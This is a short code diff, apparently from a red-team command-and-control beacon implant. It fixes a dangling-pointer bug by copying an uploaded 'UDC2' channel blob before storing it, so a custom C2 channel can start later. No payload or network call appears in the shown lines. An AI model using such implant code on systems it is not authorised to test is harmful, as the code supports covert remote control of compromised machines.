@@ -313,9 +313,15 @@ void command_data_store(char * buffer, int length, void (*callback)(char * buffe
 			return;
 		}
 		/* tier-2 item6: a UDC2 BOF upload (magic header) also lands in
-		 * the named-value store so udc2_init can engage the channel */
+		 * the named-value store so udc2_init can engage the channel.
+		 * BeaconAddValue keeps the pointer - copy off the transient task
+		 * buffer (the wire buffer is wiped after the task). */
 		if (blob.length > 12 && *(int *)blob.buffer == 0x32434455) {
-			BeaconAddValue("udc2", blob.buffer);
+			char * keep = (char *)malloc(blob.length);
+			if (keep != NULL) {
+				memcpy(keep, blob.buffer, blob.length);
+				BeaconAddValue("udc2", keep);
+			}
 		}
 		put_be32(out, (unsigned int)idx);
 		put_be64(out + 4, hash);
